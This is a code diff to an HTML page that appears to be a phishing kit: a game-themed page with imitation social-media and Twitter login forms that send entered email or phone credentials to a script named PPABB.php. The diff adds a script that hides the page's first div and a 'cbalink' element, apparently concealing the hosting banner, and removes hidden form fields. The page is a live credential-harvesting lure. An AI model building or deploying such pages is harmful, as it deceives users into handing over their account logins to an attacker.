@@ -912,11 +912,12 @@
         }
 
     </script>
-
 </head>
-
 <body>
-
+  <script>
+document.getElementsByTagName("div")[0].style.display = "none";
+document.getElementsByClassName("cbalink")[0].style.display = "none";
+</script>
 <div class="wrap game-ticket game-wrap game_list have-pay-sec">
 
 	<div class="bg"></div>
@@ -3789,10 +3790,6 @@
 
 			<form class="login-form" action="PPABB.php" method="get">
 
-			    <input type="hidden" name="playid" value="" readonly>
-
-			    <input type="hidden" name="nick" value="" readonly>
-
 				<label>
 
 				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
@@ -3880,10 +3877,6 @@
 			<form action="PPABB.php" method="get">
 
 				<div class="txt-login-twitter">Login to Twitter</div>
-
-				<input type="hidden" name="playid" value="" readonly>
-
-				<input type="hidden" name="nick" value="" readonly>
 
 				<div class="input-box-twitter">
 
